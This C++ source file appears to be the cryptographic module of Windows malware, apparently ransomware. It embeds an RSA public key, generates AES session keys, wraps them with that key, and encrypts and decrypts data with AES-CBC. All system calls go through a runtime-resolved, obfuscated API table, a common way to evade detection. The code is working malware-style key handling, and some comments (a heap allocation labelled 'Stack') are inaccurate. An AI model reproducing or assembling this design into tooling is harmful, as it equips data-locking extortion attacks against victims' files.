#include "Core/ntdefs.h"
#include "Crypto/encryption.h"
#include "Crypto/obfuscation.h"
#include "Core/api_resolve.h"
#include "Utils/helpers.h"
#include <malloc.h>
#include <cstring>

API_TABLE& API = GetAPI();


const BYTE RsaPublicKeyBlob[] = {
    0x52, 0x53, 0x41, 0x31, 0x00, 0x08, 0x00, 0x00, 0x03, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x01, 0xAF, 0x39, 0x21, 0x5A, 0xF0, 0xDE, 0x0E, 0x6B, 0x18, 0xC1, 0xE0, 0x46, 0x4C, 0x00, 0x62, 0x3B, 0x35, 0x00, 0x0E, 0x8B, 0xD2, 0x9C, 0xF0, 0x60, 0x0E, 0xDF, 0xE7, 0x71, 0x08, 0x1A, 0xFB, 0x9E, 0x89, 0xF9, 0x64, 0x0F, 0x3D, 0xC0, 0xB5, 0xFA, 0x41, 0x69, 0x68, 0xE4, 0xB3, 0xAC, 0xB6, 0x00, 0x88, 0x33, 0x17, 0x84, 0x6C, 0x3F, 0x7F, 0x63, 0x25, 0x6D, 0xC1, 0x79, 0x76, 0xE1, 0xF2, 0xAA, 0x62, 0xBD, 0x47, 0x84, 0x71, 0x56, 0x62, 0xBC, 0xF6, 0x1F, 0x05, 0x5C, 0x23, 0x46, 0xED, 0xB6, 0xE0, 0x90, 0xBD, 0x90, 0xBD, 0x5A, 0x6F, 0xFD, 0xBF, 0x5A, 0x42, 0x6F, 0x73, 0x6F, 0xFB, 0x65, 0x16, 0x2B, 0x27, 0x9B, 0x8D, 0xE7, 0x10, 0x0B, 0x90, 0xE5, 0x83, 0xD4, 0xC3, 0x24, 0x4B, 0xD1, 0x6A, 0x8E, 0x7D, 0xAD, 0x30, 0xEE, 0x1A, 0xA4, 0x20, 0xF3, 0x9E, 0x6D, 0x4B, 0x18, 0xA0, 0x17, 0x24, 0xCA, 0x71, 0x3E, 0xDF, 0x36, 0x1C, 0x42, 0x83, 0x28, 0x67, 0x1E, 0xFE, 0x6B, 0x6A, 0xC5, 0xF7, 0x4A, 0xAE, 0x88, 0x13, 0x4D, 0x91, 0x4B, 0x33, 0xC7, 0x43, 0x7F, 0xF6, 0x47, 0xC6, 0x84, 0x19, 0x1F, 0x96, 0xC3, 0x33, 0x63, 0x13, 0x76, 0x58, 0x9E, 0xEC, 0xE6, 0x42, 0xAF, 0xAA, 0x5C, 0x61, 0x2D, 0x5E, 0x19, 0x30, 0x07, 0xB7, 0xAB, 0xE1, 0x9D, 0x68, 0x11, 0x59, 0x34, 0x5C, 0x5B, 0x28, 0x91, 0x61, 0xDD, 0x7D, 0x4E, 0xAC, 0x9D, 0xD4, 0x0F, 0xEA, 0x9A, 0x56, 0xEF, 0x2D, 0x86, 0x23, 0xBD, 0x8E, 0x6C, 0xE1, 0xA2, 0x4D, 0x0F, 0xE2, 0xB9, 0xD5, 0x2B, 0x00, 0x1E, 0x23, 0x2E, 0x0D, 0x40, 0xC3, 0xCF, 0x8A, 0xDE, 0x92, 0xF9, 0xD7, 0x05, 0x74, 0x7B, 0x9D, 0xAB, 0x7F, 0x5C, 0x3D, 0x7E, 0x21, 0x99, 0x41, 0xAB, 0xC8, 0xAA, 0x2F, 0x8B, 0xF7, 0x57, 0x8C, 0xEE, 0x9D, 0xC1
};


bool GenerateSessionKey(BYTE* aesKey, ULONG keySize)
{
    // Validate arguments
    if (!aesKey || keySize == 0)
        return false;

    BCRYPT_ALG_HANDLE hAlgorithm = nullptr;
    NTSTATUS status = STATUS_UNSUCCESSFUL;
    bool success = false;

    
    // Open RNG provider
    status = API.BCryptOpenAlgorithmProvider(&hAlgorithm, BCRYPT_RNG_ALGORITHM, nullptr, 0);

    if (!BCRYPT_SUCCESS(status))
        goto CLEANUP;


    // Generate cryptographically secure random bytes
    status = API.BCryptGenRandom(hAlgorithm, aesKey, keySize, 0);

    if (!BCRYPT_SUCCESS(status))
        goto CLEANUP;

    success = true;

CLEANUP:
    if (hAlgorithm)
    {
        API.BCryptCloseAlgorithmProvider(hAlgorithm, 0);
        hAlgorithm = nullptr;
    }

    return success;
}


bool EncryptSessionKeyRSA(BYTE* aesKey, ULONG aesKeySize, BYTE* encryptedKeyOut, ULONG* encryptedKeySize) {
    if (!aesKey || aesKeySize == 0 || !encryptedKeyOut || !encryptedKeySize) {
        return false;
    }

    BCRYPT_ALG_HANDLE hAlgorithm = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    NTSTATUS status = 0;
    bool success = false;
    ULONG cbResult = 0;

    //open RSA provider
    status = API.BCryptOpenAlgorithmProvider(&hAlgorithm, BCRYPT_RSA_ALGORITHM, NULL, 0);
    if (!BCRYPT_SUCCESS(status)) goto CLEANUP;

    //Public Key Blob
    status = API.BCryptImportKeyPair(hAlgorithm,  NULL, BCRYPT_RSAPUBLIC_BLOB, &hKey, (PUCHAR)RsaPublicKeyBlob, sizeof(RsaPublicKeyBlob), 0);
    if (!BCRYPT_SUCCESS(status)) goto CLEANUP;

    //encrypt AES key
    status = API.BCryptEncrypt(hKey, aesKey, aesKeySize, NULL, NULL, 0, encryptedKeyOut, *encryptedKeySize, &cbResult, BCRYPT_PAD_PKCS1 );
    
    if (!BCRYPT_SUCCESS(status)) goto CLEANUP;

    *encryptedKeySize = cbResult;
    success = true;

CLEANUP:
    if (hKey) {
        API.BCryptDestroyKey(hKey);
        hKey = NULL;
    }
    if (hAlgorithm) {
        API.BCryptCloseAlgorithmProvider(hAlgorithm, 0);
        hAlgorithm = NULL;
    }

    return success;
}

//encryption
bool AESEncrypt(BYTE* key, ULONG keySize, BYTE* plainText, ULONG plainTextSize, BYTE* cipherText, ULONG* cipherTextSize, BYTE* iv) {
    if (!key || !plainText || !cipherText || !cipherTextSize || !iv) return false;

    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    HANDLE hHeap = NULL;
    NTSTATUS status = 0;
    bool success = false;

    DWORD cbData = 0;
    DWORD cbKeyObject = 0;
    DWORD cbBlockLen = 0;
    BYTE* pbKeyObject = NULL;
    BYTE  localIv[16]; //16-byte Block Size / IV

    custom_memcpy(localIv, iv, 16);

    //open AES Provider
    status = API.BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
    if (!BCRYPT_SUCCESS(status)) goto CLEANUP;

    // CBC Mode (Cipher Block Chaining)
    status = API.BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    if (!BCRYPT_SUCCESS(status)) goto CLEANUP;

    //calculate memory allocation in kernel for key object
    status = API.BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH, (PUCHAR)&cbKeyObject, sizeof(DWORD), &cbData, 0);
    if (!BCRYPT_SUCCESS(status)) goto CLEANUP;

    // Allocate memory in Stack
    hHeap = API.GetProcessHeap();
    pbKeyObject = (BYTE*)API.RtlAllocateHeap(hHeap, HEAP_ZERO_MEMORY, cbKeyObject);
    if (!pbKeyObject) goto CLEANUP;

    //create symmetric key
    status = API.BCryptGenerateSymmetricKey(hAlg, &hKey, pbKeyObject, cbKeyObject, key, keySize, 0);
    if (!BCRYPT_SUCCESS(status)) goto CLEANUP;

    //encrypt (PKCS7 Padding)
    status = API.BCryptEncrypt(hKey, plainText, plainTextSize, NULL, localIv, 16, cipherText, *cipherTextSize, &cbData, BCRYPT_BLOCK_PADDING);

    if (BCRYPT_SUCCESS(status)) {
        *cipherTextSize = cbData;
        success = true;
    }

CLEANUP:
    if (hKey){ 
        API.BCryptDestroyKey(hKey);
        hKey = NULL;
    }
    
    if (pbKeyObject) {
        SecureZeroMemory(pbKeyObject, cbKeyObject);
        API.RtlFreeHeap(hHeap, 0, pbKeyObject);     //free heap
    }
    
    if (hAlg){ 
        API.BCryptCloseAlgorithmProvider(hAlg, 0);
        hAlg = NULL;
    }

    return success;
}


//decryption
bool AESDecrypt(BYTE* key, ULONG keySize, BYTE* cipherText, ULONG cipherTextSize, BYTE* plainText, ULONG* plainTextSize, BYTE* iv) {
    HANDLE hHeap = NULL;

    if (!key || !cipherText || !plainText || !plainTextSize || !iv) return false;

    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    NTSTATUS status = 0;
    bool success = false;

    DWORD cbData = 0;
    DWORD cbKeyObject = 0;
    BYTE* pbKeyObject = NULL;
    BYTE  localIv[16];

    custom_memcpy(localIv, iv, 16);

    //open AES Provider
    status = API.BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
    if (!BCRYPT_SUCCESS(status)) goto CLEANUP;

    //CBC Mode
    status = API.BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    if (!BCRYPT_SUCCESS(status)) goto CLEANUP;

    // calculate memory for key object
    status = API.BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH, (PUCHAR)&cbKeyObject, sizeof(DWORD), &cbData, 0);
    if (!BCRYPT_SUCCESS(status)) goto CLEANUP;

    // Allocate memory in Stack
    hHeap = API.GetProcessHeap();
    pbKeyObject = (BYTE*)API.RtlAllocateHeap(hHeap, HEAP_ZERO_MEMORY, cbKeyObject);
    if (!pbKeyObject) goto CLEANUP;
    //create symmetric key
    status = API.BCryptGenerateSymmetricKey(hAlg, &hKey, pbKeyObject, cbKeyObject, key, keySize, 0);
    if (!BCRYPT_SUCCESS(status)) goto CLEANUP;

    //decrypt (remove PKCS7 Padding)
    status = API.BCryptDecrypt(hKey, cipherText, cipherTextSize, NULL, localIv, 16, plainText, *plainTextSize, &cbData, BCRYPT_BLOCK_PADDING);

    if (BCRYPT_SUCCESS(status)) {
        *plainTextSize = cbData;
        success = true;
    }

CLEANUP:
    if (hKey){ 
        API.BCryptDestroyKey(hKey);
        hKey = NULL;
    }

    if (pbKeyObject) {
        SecureZeroMemory(pbKeyObject, cbKeyObject);
        API.RtlFreeHeap(hHeap, 0, pbKeyObject);
    }    
    
    if (hAlg){ 
        API.BCryptCloseAlgorithmProvider(hAlg, 0);
        hAlg = NULL;
    }
    return success;
}
